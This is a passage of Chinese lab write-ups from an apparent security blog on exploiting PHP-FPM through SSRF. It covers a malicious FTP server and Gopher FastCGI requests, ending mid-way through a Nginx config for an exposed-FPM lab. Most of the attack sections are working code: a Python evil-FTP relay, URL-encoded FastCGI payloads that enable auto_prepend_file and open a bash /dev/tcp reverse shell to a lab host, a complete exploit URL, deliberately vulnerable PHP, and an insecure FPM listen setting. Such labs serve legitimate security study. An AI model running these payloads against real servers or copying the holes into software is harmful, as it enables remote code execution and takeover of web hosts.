href="https://mp.weixin.qq.com/s/UPf62W0LoOGsFAdH4uqBcQ">https://mp.weixin.qq.com/s/UPf62W0LoOGsFAdH4uqBcQ</a></p><p>我对此文件进一步修改了下，使其更好用一点……因为这里踩了好长时间的坑……</p><p>关于状态码：<a href="https://blog.csdn.net/qq981378640/article/details/51254177">https://blog.csdn.net/qq981378640/article/details/51254177</a></p></blockquote><p>替换data内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : INA</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对gopherus生成的payload进行一次urldecode</span></span><br><span class="line"><span class="comment"># 标准请求：ftp://aaa@192.168.64.128:23/123</span></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">data1 = <span class="string">&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.64.128/7777%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;</span></span><br><span class="line"></span><br><span class="line">payload = unquote(data1)</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体设置 ################################</span></span><br><span class="line">Host = <span class="string">&#x27;0.0.0.0&#x27;</span>  <span class="comment"># FTP开到公网上</span></span><br><span class="line">Port = <span class="number">23</span>  <span class="comment"># FTP服务端口</span></span><br><span class="line">Real_IP = <span class="string">&quot;192,168,64,128&quot;</span>  <span class="comment"># 可访问服务IP</span></span><br><span class="line">PASV_Port = <span class="number">1234</span>    <span class="comment"># PASV模式端口号</span></span><br><span class="line">FPM_Port = <span class="number">9000</span>     <span class="comment"># 受害机FPM服务端口号</span></span><br><span class="line"><span class="comment"># #######################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp主回应</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((Host, Port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp被动模式的passvie port,监听到1234</span></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((Host, PASV_Port))</span><br><span class="line">sk2.listen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计数器，用于区分是第几次ftp连接</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># USER aaa\r\n  客户端传来用户名</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;220 ready\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 ready\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;215 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># SIZE /123\r\n  客户端询问文件/123的大小</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;213 3 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;300 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># EPSV\r\n&#x27;</span></span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># PASV模式，告诉请求机到哪个端口寻求数据</span></span><br><span class="line">        <span class="comment"># 这里需要可访问的服务IP</span></span><br><span class="line">        con_ip = <span class="string">&quot;227&quot;</span> + <span class="string">&quot; &quot;</span> + Real_IP + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(PASV_Port / <span class="number">256</span>)) + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(PASV_Port % <span class="number">256</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        con_ip = <span class="built_in">bytes</span>(con_ip, encoding=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        conn.send(con_ip)</span><br><span class="line">        <span class="comment"># conn.send(b&quot;227 127,0,0,1,4,210\n&quot;)  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 第二次连接，告诉请求机把数据放到哪</span></span><br><span class="line">        con2_ip = <span class="string">&quot;227&quot;</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;127,0,0,1&quot;</span> + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(FPM_Port/<span class="number">256</span>)) + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(FPM_Port % <span class="number">256</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        con2_ip = <span class="built_in">bytes</span>(con2_ip, encoding=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        conn.send(con2_ip)</span><br><span class="line">        <span class="comment"># conn.send(b&quot;227 127,0,0,1,35,40\n&quot;)  # 端口计算规则：35*256+40=9000 9000 fpm常用端口</span></span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;125 \n&quot;</span>)  <span class="comment"># 告诉客户端可以开始数据连接了</span></span><br><span class="line">        <span class="comment"># 新建一个socket给服务端返回我们的payload</span></span><br><span class="line">        print(<span class="string">&quot;建立连接!&quot;</span>)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        print(<span class="string">&quot;断开连接!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;150 \n&quot;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;226 \n&quot;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行，起FTP服务</p><h5><span id="开启监听">开启监听</span></h5><p><img src="/images/%E5%AE%9E%E9%AA%8C--%E9%80%9A%E8%BF%87FTP_SSRF_%E6%94%BB%E5%87%BBPHP-FPM/image-20211109231743972.png" alt="image-20211109231743972"></p><h5><span id="ssrf">SSRF</span></h5><p>在<code>file.php</code>中：</p><img src="/images/实验--通过FTP_SSRF_攻击PHP-FPM/image-20211109231808693.png" alt="image-20211109231808693" style="zoom:80%;"><img src="/images/实验--通过FTP_SSRF_攻击PHP-FPM/image-20211109231856589.png" alt="image-20211109231856589" style="zoom:80%;"><p><strong>成功反弹shell！</strong></p><h4><span id="拓展">拓展</span></h4><p>当仅有<code>file2.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents($_GET[<span class="string">&#x27;file&#x27;</span>], $_GET[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>我们只需要对请求与数据进行转发即可</p><h5><span id="简单的恶意-ftp-服务">简单的恶意 FTP 服务</span></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单的数据转发</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment"># Service ready for new user.</span></span><br><span class="line"><span class="comment"># Client send anonymous username</span></span><br><span class="line"><span class="comment"># USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment"># User name okay, need password.</span></span><br><span class="line"><span class="comment"># Client send anonymous password.</span></span><br><span class="line"><span class="comment"># PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment"># User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment"># TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment"># Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment"># EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment"># PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>)  <span class="comment"># STOR / (2) # FPM端口号</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment"># QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h5><span id="攻击">攻击</span></h5><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.129&#x2F;file2.php?file&#x3D;ftp:&#x2F;&#x2F;aaa@192.168.64.128:23&#x2F;123&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;192.168.64.128&#x2F;7777%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><img src="/images/实验--通过FTP_SSRF_攻击PHP-FPM/image-20211109233106420.png" alt="image-20211109233106420" style="zoom:80%;"><p>反弹成功！</p><p>参考文章:<br>[浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法](<a href="https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA">https://whoamianony.top/2021/05/15/Web安全/浅入深出</a> Fastcgi 协议分析与 PHP-FPM 攻击方法/)</p><p><a href="https://mp.weixin.qq.com/s/UPf62W0LoOGsFAdH4uqBcQ">LARAVEL的那个RCE最有趣的点在这里</a></p><p><a href="https://github.com/Maskhe/evil_ftp/blob/master/evil_ftp.py">https://github.com/Maskhe/evil_ftp/blob/master/evil_ftp.py</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;通过受害机请求恶意FTP服务，攻击内网中脆弱的FPM服务&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>实验--SSRF_PHP-FPM</title>
    <link href="http://example.com/2021/11/09/%E5%AE%9E%E9%AA%8C--SSRF_PHP-FPM/"/>
    <id>http://example.com/2021/11/09/%E5%AE%9E%E9%AA%8C--SSRF_PHP-FPM/</id>
    <published>2021-11-09T00:45:03.161Z</published>
    <updated>2021-11-24T13:59:53.909Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>SSRF 攻击内网脆弱的PHP-FPM组件</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E5%AE%9E%E9%AA%8C-ssrf_php-fpm">实验–SSRF_PHP-FPM</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-%E5%87%86%E5%A4%87ssrf%E8%B7%B3%E6%9D%BF-php-fpm%E7%8E%AF%E5%A2%83">环境准备-准备SSRF跳板 PHP-FPM环境</a></li><li><a href="#%E5%8E%9F%E7%90%86%E5%87%86%E5%A4%87">原理准备</a><ul><li><a href="#gopher-%E5%8D%8F%E8%AE%AE">Gopher 协议</a></li></ul></li><li><a href="#ssrf">SSRF</a></li></ul></li></ul><!-- tocstop --></div><br><h3><span id="实验ssrf_php-fpm">实验–SSRF_PHP-FPM</span></h3><blockquote><p>实验环境：</p><p>攻击机：kali-linux-2020.3     IP：192.168.64.129</p><p>服务机：Ubuntu 20                IP：192.168.64.128</p></blockquote><h4><span id="环境准备-准备ssrf跳板-php-fpm环境">环境准备-准备SSRF跳板 PHP-FPM环境</span></h4><blockquote><p>[浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法](<a href="https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA">https://whoamianony.top/2021/05/15/Web安全/浅入深出</a> Fastcgi 协议分析与 PHP-FPM 攻击方法/)</p></blockquote><p><code>ssrf.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $curl = curl_init($url);    </span><br><span class="line">    <span class="comment">//第二种初始化curl的方式</span></span><br><span class="line">    <span class="comment">//$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET[&#x27;url&#x27;]); </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*进行curl配置*/</span></span><br><span class="line">    curl_setopt($curl, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出HTTP头</span></span><br><span class="line">    $responseText = curl_exec($curl);</span><br><span class="line">    <span class="comment">//var_dump(curl_error($curl) ); // 如果执行curl过程中出现异常，可打开此开关，以便查看异常内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $responseText;</span><br><span class="line">    curl_close($curl);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>/etc/php/7.4/fpm/pool.d/www.conf</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;listen = /run/php/php7.4-fpm.sock</span></span><br><span class="line"><span class="attr">listen</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span></span><br></pre></td></tr></table></figure><blockquote><p>此时目标主机存在 SSRF 漏洞，并且通过 SSRF 可以探测到目标主机上 9000 端口上运行的 php-fpm。此时，虽然 php-fpm 没有暴露在公网上，但是由于存在 SSRF 漏洞，我们便可以通过 SSRF 漏洞配合 Gopher 协议去打内网的 php-fpm。</p><p><img src="/images/%E5%AE%9E%E9%AA%8C--SSRF_PHP-FPM/image-20211109085351225-16364192394201.png" alt="image-20211109085351225"></p><p>直接攻击无法连接并发送数据进行执行</p></blockquote><h4><span id="原理准备">原理准备</span></h4><h5><span id="gopher-协议">Gopher 协议</span></h5><blockquote><p><a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究</a></p></blockquote><blockquote><p>​        Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p>​        gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p></blockquote><h4><span id="ssrf">SSRF</span></h4><p>利用<code>gopherus</code>生成有效payload</p><p><img src="/images/%E5%AE%9E%E9%AA%8C--SSRF_PHP-FPM/image-20211109090230868.png" alt="image-20211109090230868"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p><strong>二次编码</strong>（curl一次，get一次）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><img src="/images/实验--SSRF_PHP-FPM/image-20211109090404240.png" alt="image-20211109090404240" style="zoom:80%;"><p>完成攻击</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;SSRF 攻击内网脆弱的PHP-FPM组件&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>实验--PHP-FPM_未授权访问漏洞</title>
    <link href="http://example.com/2021/11/08/%E5%AE%9E%E9%AA%8C--PHP-FPM_%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/11/08/%E5%AE%9E%E9%AA%8C--PHP-FPM_%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-11-08T13:48:42.267Z</published>
    <updated>2021-11-24T14:00:01.302Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>PHP-FPM 服务暴漏导致的命令执行</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E5%AE%9E%E9%AA%8C-php-fpm_%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E">实验–PHP-FPM_未授权访问漏洞</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-ubuntu-20-%E5%87%86%E5%A4%87php-fpm%E7%8E%AF%E5%A2%83">环境准备-Ubuntu 20 准备PHP-FPM环境</a><ul><li><a href="#php-fpm-%E8%AE%BE%E7%BD%AE">PHP-FPM 设置</a></li><li><a href="#nginx-%E9%85%8D%E7%BD%AE">Nginx 配置</a></li><li><a href="#%E7%8E%AF%E5%A2%83%E5%90%AF%E5%8A%A8">环境启动</a></li><li><a href="#%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6">入口文件</a></li></ul></li><li><a href="#%E5%8E%9F%E7%90%86%E5%87%86%E5%A4%87">原理准备</a><ul><li><a href="#cgi">CGI</a></li><li><a href="#fastcgi">FastCGI</a></li><li><a href="#php-fpm">PHP-FPM</a></li><li><a href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">任意代码执行</a></li><li><a href="#php_value-%E5%92%8C-php_admin_value">PHP_VALUE 和 PHP_ADMIN_VALUE</a></li></ul></li><li><a href="#fpm-%E8%AF%B7%E6%B1%82">FPM 请求</a></li></ul></li></ul><!-- tocstop --></div><br>### 实验--PHP-FPM_未授权访问漏洞<blockquote><p>实验环境：</p><p>攻击机：kali-linux-2020.3     IP：192.168.64.129</p><p>服务机：Ubuntu 20                IP：192.168.64.128</p></blockquote><h4><span id="环境准备-ubuntu-20-准备php-fpm环境">环境准备-Ubuntu 20 准备PHP-FPM环境</span></h4><p>安装Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure><p>安装php、php-fpm以及一些插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej/php </span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install php7.4</span><br><span class="line">sudo apt-get -y install php7.4-fpm php7.4-mysql php7.4-curl php7.4-json php7.4-mbstring php7.4-xml php7.4-intl</span><br></pre></td></tr></table></figure><blockquote><p>稍有变动</p></blockquote><h5><span id="php-fpm-设置">PHP-FPM 设置</span></h5><p>设置监听9000端口来处理 Nginx 的请求，并将 PHP-FPM 暴露在 0.0.0.0 上</p><p><code>/etc/php/7.4/fpm/pool.d/www.conf</code>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;listen = /run/php/php7.4-fpm.sock</span></span><br><span class="line"><span class="attr">listen</span> = <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9000</span></span><br></pre></td></tr></table></figure><blockquote><p>此时将 PHP-FPM 的监听地址设置为了 <code>0.0.0.0:9000</code>，便会产生PHP-FPM 未授权访问漏洞，此时攻击者可以直接与暴露在目标主机 9000 端口上的 PHP-FPM 进行通信，进而可以实现任意代码执行。</p></blockquote><p>修改权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /run/php/php7.4-fpm.sock</span><br></pre></td></tr></table></figure><h5><span id="nginx-配置">Nginx 配置</span></h5><p><code>/etc/nginx/sites-available/default</code>:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>; <span class="comment">#监听80端口，接收http请求</span></span><br><span class="line">    <span class="attribute">server_name</span>  www.example.com; <span class="comment">#就是网站地址</span></span><br><span class="line">    <span class="attribute">root</span> /var/www/html; <span class="comment"># 准备存放代码工程的路径</span></span><br><span class="line">    <span class="comment">#路由到网站根目录www.example.com时候的处理</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">index</span> index.php; <span class="comment">#跳转到www.example.com/index.php</span></span><br><span class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">#当请求网站下php文件的时候，反向代理到php-fpm</span></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> 